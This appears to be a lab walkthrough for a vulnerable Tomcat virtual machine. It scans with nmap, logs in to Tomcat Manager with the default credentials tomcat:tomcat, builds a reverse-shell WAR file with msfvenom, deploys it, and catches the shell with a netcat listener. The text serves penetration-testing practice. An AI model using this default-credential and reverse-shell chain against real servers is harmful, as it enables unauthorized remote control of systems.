<div class="page">

# My_Tomcat_Host

\

## 

## My_Tomcat_Host

- **<span style="color:#060f94;">My_Tomcat_Host</span>** :-

<!-- -->

- Download the machine .
- Import the ova file in virtual box .
- Then start the machine .

<!-- -->

- Not assign the ip :

![](images/7-1.png)

- If not show the ip then check network connection in virtul box .

1.  <span style="color:#f6d32d;">Recon and Enumeration</span> :

- Run nmap command to scan :

<div class="codebox">

    nmap -sn 192.168.2.0/24

</div>

![](images/7-2.png)

<div class="codebox">

    nmap -v -p- 192.168.2.135

</div>

![](images/7-3.png)

- Notable open ports : 22/tcp – SSH 8080/tcp – Apache Tomcat

1.  <span style="color:#f6d32d;">Exploring Apache Tomcat</span> :

- Access Web Interface :
- Navigate to : <http://192.168.2.135:8080/>

![](images/7-4.png) Default Tomcat page visible.

- Tomcat Manager Login :

![](images/7-5.png)

- Common default creds : tomcat:tomcat admin:admin

![](images/7-6.png) Login successful with tomcat:tomcat

1.  <span style="color:#f6d32d;">Uploading a Reverse Shell</span> :

- Creating JSP Reverse Shell :
- Use msfvenom to create a WAR file :

<div class="codebox">

    msfvenom -p java/shell_reverse_tcp LHOST=192.168.2.219 LPORT=443 -f war -o shell.war

</div>

![](images/7-7.png)

- Upload WAR File : <http://192.168.2.135:8080/manager/html>

![](images/7-8.png)

- Deploy WAR File : Upload shell.war via Tomcat Manager.

![](images/7-9.png)

1.  <span style="color:#f6d32d;">Getting a Reverse Shell</span> :

- Start Listener :

<div class="codebox">

    nc -lvnp 443

</div>

- Trigger Shell : Visit : <http://192.168.2.135:8080/shell/> Netcat
  receives a connection.

<!-- -->

- Get the reverse shell :

![](images/7-10.png)

</div>
